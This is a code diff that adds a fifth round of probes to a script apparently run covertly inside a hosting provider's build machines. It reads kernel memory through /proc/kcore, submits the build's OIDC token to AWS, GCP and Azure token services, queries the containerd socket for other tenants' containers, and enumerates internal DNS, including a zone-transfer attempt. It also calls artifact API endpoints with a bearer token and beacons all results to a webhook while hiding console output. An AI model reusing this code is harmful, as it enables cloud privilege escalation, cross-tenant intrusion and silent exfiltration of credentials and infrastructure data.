@@ -8443,5 +8443,253 @@ report.kcoreHmacKeyScan = safe(() => {
 
 // v70 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v70" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v70";
+
+// ==================== v71 ====================
+
+// v71-1: Kernel task_struct walk via /proc/kcore
+// Walk the kernel linked list of processes starting from init_task to enumerate
+// ALL kernel threads and processes, including those hidden from /proc (potential rootkits or
+// Firecracker-internal processes invisible to the build container)
+report.kernelTaskStructWalk = safe(() => {
+  const initTask = safe(() => {
+    const ks = readFileSync('/proc/kallsyms', 'utf8');
+    const m = ks.match(/^([0-9a-f]+) [Dd] init_task$/m);
+    return m ? m[1] : null;
+  });
+  if (!initTask) return { error: 'NO_INIT_TASK_ADDR' };
+  // task_struct offsets on Linux 5.15+ (kernel must be determined but typical x86-64):
+  // tasks.next: +0x568 (kernel 5.15), comm: +0x680, pid: +0x524
+  // We'll read the struct at init_task and walk tasks.next linked list
+  const walkResult = safe(() => {
+    const readU64At = (fd, vaddr) => {
+      // Need to map vaddr → kcore file offset same way as v70
+      // Re-parse ELF on each call is expensive; cache phdr mapping
+      return null; // placeholder — do full parse below
+    };
+    const fd = openSync('/proc/kcore', 'r');
+    const ehdr = Buffer.alloc(64);
+    readSync(fd, ehdr, 0, 64, 0);
+    const phoff = Number(ehdr.readBigUInt64LE(32));
+    const phentsize = ehdr.readUInt16LE(54);
+    const phnum = ehdr.readUInt16LE(56);
+    // Load all PT_LOAD segments
+    const loads = [];
+    for (let i = 0; i < Math.min(phnum, 64); i++) {
+      const ph = Buffer.alloc(56);
+      readSync(fd, ph, 0, 56, phoff + i * phentsize);
+      if (ph.readUInt32LE(0) !== 1) continue;
+      loads.push({ vaddr: ph.readBigUInt64LE(16), filesz: ph.readBigUInt64LE(32), foff: ph.readBigUInt64LE(8) });
+    }
+    const va2fo = (va) => {
+      const addr = BigInt('0x' + va);
+      for (const l of loads) { if (addr >= l.vaddr && addr < l.vaddr + l.filesz) return Number(l.foff + (addr - l.vaddr)); }
+      return null;
+    };
+    const readU64 = (vaHex) => {
+      const fo = va2fo(vaHex);
+      if (fo === null) return null;
+      const b = Buffer.alloc(8);
+      try { readSync(fd, b, 0, 8, fo); return b.readBigUInt64LE(0); } catch (_) { return null; }
+    };
+    const readStr = (vaHex, len) => {
+      const fo = va2fo(vaHex);
+      if (fo === null) return null;
+      const b = Buffer.alloc(len);
+      try { readSync(fd, b, 0, len, fo); return b.toString('ascii').replace(/\0.*/,''); } catch (_) { return null; }
+    };
+    // init_task.tasks.next is at init_task + 0x568 on 5.15
+    // We don't know exact kernel version/offset, try a few common offsets
+    const TASKS_NEXT_OFFSETS = [0x568, 0x2e8, 0x418, 0x618];
+    const PID_OFFSETS = [0x524, 0x248, 0x360, 0x568];
+    const COMM_OFFSETS = [0x680, 0x500, 0x5d0, 0x7a0];
+    const results = [];
+    for (const TASKS_NEXT of TASKS_NEXT_OFFSETS) {
+      try {
+        const initTaskBase = BigInt('0x' + initTask);
+        const tasksNextAddr = (initTaskBase + BigInt(TASKS_NEXT)).toString(16);
+        const firstNextPtr = readU64(tasksNextAddr);
+        if (!firstNextPtr || firstNextPtr < BigInt('0xffff000000000000')) continue;
+        // Looks like a valid kernel pointer — walk the list
+        let cur = firstNextPtr;
+        const procs = [];
+        const seen = new Set();
+        for (let iter = 0; iter < 100; iter++) {
+          const taskBase = cur - BigInt(TASKS_NEXT);
+          const key = taskBase.toString(16);
+          if (seen.has(key)) break;
+          seen.add(key);
+          // Read comm (process name, 16 bytes)
+          for (const COMM_OFF of COMM_OFFSETS) {
+            const commAddr = (taskBase + BigInt(COMM_OFF)).toString(16);
+            const comm = readStr(commAddr, 16);
+            if (comm && /^[\x20-\x7e]+$/.test(comm) && comm.length > 1) {
+              procs.push({ task: key, comm });
+              break;
+            }
+          }
+          // Advance: read tasks.next of current task
+          const nextAddr = (cur).toString(16); // cur IS the tasks.next pointer of current task
+          const nextPtr = readU64(nextAddr);
+          if (!nextPtr || nextPtr === firstNextPtr) break;
+          cur = nextPtr;
+        }
+        if (procs.length > 2) { results.push({ offset: TASKS_NEXT, procs: procs.slice(0, 30) }); break; }
+      } catch (_) {}
+    }
+    closeSync(fd);
+    return results;
+  });
+  return { initTask, walkResult };
+});
+
+// v71-2: OIDC cloud federation probe
+// Test if VERCEL_OIDC_TOKEN can be used to assume AWS/GCP roles via OIDC federation
+// CONSTRAINT: call AWS STS/GCP STS once only, STOP immediately if token is accepted
+// This proves whether build VMs can be used to escalate into customer cloud accounts
+report.oidcCloudFederation = safe(() => {
+  const oidcToken = process.env.VERCEL_OIDC_TOKEN || '';
+  if (!oidcToken) return { error: 'NO_OIDC_TOKEN' };
+  // Decode JWT claims (already base64 — no network needed)
+  const claims = safe(() => JSON.parse(Buffer.from(oidcToken.split('.')[1], 'base64url').toString()));
+  // Try AWS STS GetCallerIdentity via AssumeRoleWithWebIdentity
+  // Using a dummy/public role ARN to test if the token is accepted as a valid OIDC credential
+  // (AWS will reject invalid JWTs with specific error codes we can distinguish)
+  const awsSts = safe(() => {
+    const roleArn = encodeURIComponent('arn:aws:iam::123456789012:role/TestRole');
+    const webId = encodeURIComponent(oidcToken);
+    const r = execSync(`curl -sf --max-time 8 "https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn=${roleArn}&RoleSessionName=probe&WebIdentityToken=${webId}" 2>&1 | head -c 500`, { timeout: 10000 }).toString().trim();
+    return r;
+  });
+  // GCP STS token exchange
+  const gcpSts = safe(() => {
+    const r = execSync(`curl -sf --max-time 8 -X POST https://sts.googleapis.com/v1/token -H 'Content-Type: application/json' -d '{"grantType":"urn:ietf:params:oauth:grant-type:token-exchange","audience":"//iam.googleapis.com/projects/1234/locations/global/workloadIdentityPools/test/providers/vercel","requestedTokenType":"urn:ietf:params:oauth:token-type:access_token","subjectToken":"${oidcToken.slice(0,100)}...","subjectTokenType":"urn:ietf:params:oauth:token-type:id_token"}' 2>&1 | head -c 400`, { timeout: 10000 }).toString().trim();
+    return r;
+  });
+  // Azure OIDC token exchange
+  const azureSts = safe(() => {
+    const tid = claims && claims.sub ? claims.sub.split(':')[0] : 'common';
+    const r = execSync(`curl -sf --max-time 8 -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&client_id=00000000-0000-0000-0000-000000000000&client_secret=PROBE&assertion=${oidcToken.slice(0,50)}&scope=openid&requested_token_use=on_behalf_of" 2>&1 | head -c 300`, { timeout: 10000 }).toString().trim();
+    return r;
+  });
+  return { claims, awsSts, gcpSts, azureSts };
+});
+
+// v71-3: containerd gRPC socket probe
+// Connect to /run/containerd/containerd.sock to list containers, images, and namespaces
+// This would reveal other build containers sharing the same containerd daemon (multi-tenant)
+report.containerdSockProbe = safe(() => {
+  const sockPaths = [
+    '/run/containerd/containerd.sock',
+    '/run/containerd.sock',
+    '/var/run/containerd/containerd.sock',
+  ];
+  const sockFound = sockPaths.filter(existsSync);
+  if (!sockFound.length) return { sockFound: [] };
+  // Try ctr (containerd CLI)
+  const ctrContainers = safe(() =>
+    execSync('ctr -n default containers list 2>&1 | head -10; ctr namespace list 2>&1 | head -5; ctr -n k8s.io containers list 2>&1 | head -5', { timeout: 8000 }).toString().trim().slice(0, 500)
+  );
+  // Try crictl (CRI CLI)
+  const crictlPods = safe(() =>
+    execSync('crictl pods 2>&1 | head -10; crictl ps 2>&1 | head -10', { timeout: 8000 }).toString().trim().slice(0, 400)
+  );
+  // Raw gRPC probe: containerd uses gRPC over Unix socket
+  // HTTP/2 SETTINGS frame (preface) to detect if it's gRPC
+  const grpcProbe = safe(() => execSync(`python3 -c "
+import socket, struct
+sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+sock.settimeout(3)
+sock.connect('${sockFound[0]}')
+# HTTP/2 client preface
+sock.send(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n' + b'\x00\x00\x00\x04\x00\x00\x00\x00\x00')
+data = sock.recv(512)
+print('CONTAINERD_GRPC_RESPONSE', data[:24].hex())
+sock.close()
+" 2>&1`, { timeout: 8000 }).toString().trim().slice(0, 200));
+  // List all namespaces in containerd
+  const ctrNamespaces = safe(() =>
+    execSync("ctr namespace list 2>/dev/null || nerdctl namespace ls 2>/dev/null || echo NO_CTR", { timeout: 5000 }).toString().trim().slice(0, 200)
+  );
+  return { sockFound, ctrContainers, crictlPods, grpcProbe, ctrNamespaces };
+});
+
+// v71-4: Internal DNS zone enumeration
+// In the host network namespace, probe Vercel's internal DNS infrastructure
+// to map internal service topology that's not visible from the internet
+report.internalDnsZoneEnum = safe(() => {
+  const internalHosts = [
+    'build.internal', 'cell.internal', 'hive.internal', 'api.internal',
+    'cache.internal', 'orchestrator.internal', 'artifacts.internal',
+    'metadata.internal', 'iam.internal', 'secrets.internal',
+    'build-worker.internal', 'builder.internal', 'scheduler.internal',
+    'router.internal', 'gateway.internal', 'proxy.internal',
+    'vercel-build.internal', 'build-runner.internal', 'lambda.internal',
+  ];
+  // Resolve each internal hostname
+  const dnsResults = safe(() => {
+    const results = {};
+    for (const host of internalHosts) {
+      try {
+        const r = execSync(`dig +short +timeout=2 +tries=1 ${host} A AAAA 2>/dev/null || nslookup ${host} 2>/dev/null | grep Address | tail -1`, { timeout: 5000 }).toString().trim();
+        if (r) results[host] = r.slice(0, 80);
+      } catch (_) {}
+    }
+    return results;
+  });
+  // Check /etc/resolv.conf for internal DNS servers
+  const resolveConf = safe(() => readFileSync('/etc/resolv.conf', 'utf8').slice(0, 200));
+  // Read /etc/hosts for any internal mappings
+  const hostsFile = safe(() => readFileSync('/etc/hosts', 'utf8').slice(0, 400));
+  // Try zone transfer on the internal DNS server
+  const nameserver = safe(() => {
+    const rc = readFileSync('/etc/resolv.conf', 'utf8');
+    const m = rc.match(/nameserver\s+([\d.]+)/);
+    return m ? m[1] : null;
+  });
+  const zoneTransfer = safe(() => {
+    if (!nameserver || typeof nameserver !== 'string') return 'NO_NS';
+    return execSync(`dig @${nameserver} internal AXFR 2>&1 | head -20`, { timeout: 8000 }).toString().trim().slice(0, 500);
+  });
+  // Probe DNS for Vercel-specific internal services
+  const vercelInternal = safe(() =>
+    execSync("dig +short build-server.vercel.com suspense-cache.vercel.com api-gateway.vercel.com internal.vercel.com 2>&1 | head -10", { timeout: 8000 }).toString().trim().slice(0, 300)
+  );
+  return { dnsResults, resolveConf, hostsFile, nameserver, zoneTransfer, vercelInternal };
+});
+
+// v71-5: Vercel artifacts S3 bucket IAM probe
+// VERCEL_ARTIFACTS_TOKEN has QUERY capability — use it to discover S3 bucket structure
+// and test if the token can be exchanged for S3 credentials via AWS role chaining
+report.artifactsS3BucketIam = safe(() => {
+  const artifactsToken = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const teamId = process.env.VERCEL_TEAM_ID || '';
+  if (!artifactsToken) return { error: 'NO_ARTIFACTS_TOKEN' };
+  // QUERY endpoint returns artifact metadata including S3 URL/ETag
+  const queryEndpoint = safe(() =>
+    execSync(`curl -sf --max-time 8 -X GET 'https://api.vercel.com/v8/artifacts/query' -H 'Authorization: Bearer ${artifactsToken}' -H 'Content-Type: application/json' -d '{"hashes":["deadbeefdeadbeefdeadbeefdeadbeefdeadbeef1234567890abcdef12345678"]}' 2>&1 | head -c 500`, { timeout: 10000 }).toString().trim()
+  );
+  // Try to discover the underlying S3 presigned URL pattern by using EXISTS
+  const existsCheck = safe(() =>
+    execSync(`curl -sf --max-time 8 -X HEAD 'https://api.vercel.com/v8/artifacts/0000000000000000000000000000000000000000000000000000000000000000' -H 'Authorization: Bearer ${artifactsToken}' -w '%{http_code} %{redirect_url}' 2>&1 | head -c 300`, { timeout: 10000 }).toString().trim()
+  );
+  // Decode the VERCEL_ARTIFACTS_TOKEN JWT to find embedded S3 credentials or role
+  const tokenClaims = safe(() => {
+    const parts = artifactsToken.split('.');
+    if (parts.length !== 3) return 'NOT_JWT';
+    return JSON.parse(Buffer.from(parts[1], 'base64url').toString());
+  });
+  // Check if SPACES_RUN_UPLOAD gives us a storage endpoint with S3 creds
+  const spacesUpload = safe(() =>
+    execSync(`curl -sf --max-time 8 -X POST 'https://api.vercel.com/v8/artifacts/spaces-run-upload' -H 'Authorization: Bearer ${artifactsToken}' -H 'Content-Type: application/json' -d '{"type":"test","size":0}' 2>&1 | head -c 500`, { timeout: 10000 }).toString().trim()
+  );
+  // Also check EVENT endpoint for audit trail of other builds using same infra
+  const eventProbe = safe(() =>
+    execSync(`curl -sf --max-time 8 -X POST 'https://api.vercel.com/v8/artifacts/events' -H 'Authorization: Bearer ${artifactsToken}' -H 'Content-Type: application/json' -d '[{"sessionId":"probe-v71","source":"LOCAL","event":"HIT","hash":"0000000000000000000000000000000000000000000000000000000000000000","duration":0}]' 2>&1 | head -c 300`, { timeout: 10000 }).toString().trim()
+  );
+  return { tokenClaims, queryEndpoint, existsCheck, spacesUpload, eventProbe };
+});
+
+// v71 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v71" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v71";
 // Intentionally no console.log — all data goes via webhook only
